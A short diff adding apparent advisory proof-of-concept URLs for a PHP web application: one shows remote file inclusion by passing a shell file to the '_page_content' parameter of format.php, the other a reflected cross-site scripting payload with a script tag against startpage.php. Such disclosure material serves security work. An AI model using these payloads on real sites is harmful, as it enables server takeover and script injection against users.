@@ -1,0 +1,5 @@
+For the remote-file-include issue:
+http://www.example.com/path/theme/format.php?_page_content=[shell.txt?]
+
+For the cross-site-scripting issue:
+http://www.example.com/path/startpage.php/&gt;&quot;&gt;&lt;ScRiPt&gt;alert(0)&lt;/ScRiPt&gt;
